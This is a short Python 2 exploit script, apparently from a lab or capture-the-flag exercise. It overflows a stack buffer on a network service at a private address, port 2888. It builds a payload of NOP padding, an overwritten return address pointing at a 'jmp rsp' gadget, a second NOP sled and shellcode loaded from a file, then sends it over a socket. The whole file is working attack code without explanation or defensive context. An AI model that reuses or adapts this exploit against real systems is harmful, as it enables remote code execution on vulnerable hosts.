import socket

#add jmp rsp to appropriate position. in case payload is of less size, pad it with NOPS.
def increase_payload_size(payload):
    max_payload_size=404#751
#    initial_buffer="\x90"*136 #jmp rsp starts from 137th position
    initial_buffer = "\x90" * 132
    updated_payload=payload
    if len(updated_payload)>=max_payload_size:
        return updated_payload
    else:
        updated_payload=initial_buffer+updated_payload
        if len(updated_payload) < max_payload_size:
            updated_payload=updated_payload+"\x90"*(max_payload_size-len(updated_payload))
    return updated_payload


def add_jmp_addr(shellcode):


    addr_rsp="\x0b\x7b\x53\x00\x00\x00\x00\x00"#0x467b0b is address of jmp rsp. So encrypted address will be 0x537b0b

    updated_payload=addr_rsp+"\x90"*20+shellcode
    return updated_payload

def send_payload(file_name):

    shellcode=""
    with open(file_name) as f:
        for line in f.readlines():
            shellcode+=line


    msg=add_jmp_addr(shellcode)
    msg=increase_payload_size(msg)
#    msg=shellcode

# final payload is <132 bytes of NOPS><8 bytes for address of jmp rsp><20 bytes of NOPS><shellcode><padding>
    host_ip="192.168.88.133"
    port=2888
    payload_file = "finalpayload"
    scket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    scket.connect((host_ip,port))
    print "Connected to server"
    scket.recv(1024)

    print "payload saved to: "+payload_file
    with open(payload_file,"wb") as f:
        f.write(msg)
    scket.send(msg)
    print "Payload of size: "+str(len(msg))+" sent to server"
    scket.recv(1024)
    print "Response received"


if __name__=="__main__":
    FILENAME = "allBytes"
    send_payload(FILENAME)